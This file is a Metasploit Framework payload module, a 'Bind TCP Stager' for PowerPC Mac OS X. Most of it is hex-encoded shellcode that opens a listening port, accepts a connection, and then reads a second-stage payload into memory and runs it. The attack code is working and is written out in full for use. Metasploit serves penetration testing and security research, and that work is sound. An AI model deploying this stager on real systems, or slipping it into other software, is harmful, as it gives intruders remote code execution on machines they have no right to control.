##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'


###
#
# BindTcp
# -------
#
# OSX bind TCP stager.
#
###
module Metasploit3

  include Msf::Payload::Stager

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Bind TCP Stager',
      'Description'   => 'Listen for a connection',
      'Author'        => 'hdm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_PPC,
      'Handler'       => Msf::Handler::BindTcp,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LPORT' => [ 34, 'n'    ],
            },
          'Payload' =>
            "\x38\x60\x00\x02\x38\x80\x00\x01\x38\xa0\x00\x06\x38\x00\x00\x61" +
            "\x44\x00\x00\x02\x7c\x00\x02\x78\x7c\x7e\x1b\x78\x48\x00\x00\x0d" +
            "\x00\x02\x11\x5c\x00\x00\x00\x00\x7c\x88\x02\xa6\x38\xa0\x00\x10" +
            "\x38\x00\x00\x68\x7f\xc3\xf3\x78\x44\x00\x00\x02\x7c\x00\x02\x78" +
            "\x38\x00\x00\x6a\x7f\xc3\xf3\x78\x44\x00\x00\x02\x7c\x00\x02\x78" +
            "\x7f\xc3\xf3\x78\x38\x00\x00\x1e\x38\x80\x00\x10\x90\x81\xff\xe8" +
            "\x38\xa1\xff\xe8\x38\x81\xff\xf0\x44\x00\x00\x02\x7c\x00\x02\x78" +
            "\x7c\x7e\x1b\x78\x38\x00\x00\x03\x7f\xc3\xf3\x78\x38\x81\xe0\x00" +
            "\x38\xa0\x20\x00\x7c\x88\x03\xa6\x44\x00\x00\x02\x7c\x00\x02\x78" +
            "\x4e\x80\x00\x20\x7c\x00\x02\x78"
        }
      ))
  end

end
